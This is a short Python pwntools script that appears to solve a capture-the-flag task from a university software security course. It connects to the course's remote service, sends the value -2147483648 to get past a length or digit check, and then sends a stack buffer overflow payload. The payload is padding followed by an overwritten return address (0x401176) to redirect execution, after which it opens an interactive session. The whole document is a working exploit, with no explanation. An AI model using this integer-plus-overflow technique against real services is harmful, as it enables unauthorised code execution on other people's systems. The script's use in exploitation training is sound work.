#!/usr/bin/env python3

import pwn

pwn.context.arch = 'amd64'
conn = pwn.remote('tasks.ws24.softsec.rub.de', 33233)
#conn = pwn.remote('127.0.0.1', 1024)

#conn = pwn.process('./vuln')
#pwn.gdb.attach(conn)

# 4 byte buffer + rbp
shellcode = b'A' * (4+8) + pwn.p64(0x401176) + b'\n'
print(shellcode.hex()) 

conn.recvuntil(b'Nappa: Hey Vegeta, how many digits can your new scouter display?\n')
conn.sendline("-2147483648".encode())
conn.recvuntil("Vegeta: Let's see what Kakarot's power level is with this new scouter.\n")
conn.send(shellcode)
conn.interactive()
